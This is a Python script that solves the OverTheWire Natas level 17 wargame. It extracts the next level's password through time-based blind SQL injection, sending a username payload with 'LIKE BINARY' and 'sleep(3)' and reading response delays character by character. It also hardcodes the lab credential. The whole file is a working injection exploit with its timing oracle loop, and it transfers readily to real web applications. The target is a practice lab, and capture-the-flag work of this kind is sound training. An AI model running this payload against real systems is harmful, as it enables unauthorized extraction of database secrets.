#!/usr/bin/python
import requests
import string
def get_flag():
    print('Loading........................')
    username = 'natas17'
    password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
    guess = ''
    i = 0
    possible_chars = string.lowercase + string.uppercase + string.digits
    while(i < len(possible_chars)):
        session = requests.Session()
        # we know that if one condition of the 3 AND conditions is broken then the server will not sleep
        # so we can "fuzz" for the correct password based on timing
        user = 'natas18" AND PASSWORD LIKE BINARY \'' + guess + possible_chars[i] + '%\' AND sleep(3) # '
        obj = {'username' : user}
        url = 'http://' + username + '.natas.labs.overthewire.org/'
        # send post request
        response = session.post(url, data = obj, auth = (username, password))
        # x = requests.post(url, data = obj)
        if(response.elapsed.seconds > 1):
            guess += possible_chars[i]
            i = 0
            print(guess)
        i += 1
    assert(len(password)==len(guess))
    print('Flag: '+guess)
get_flag()
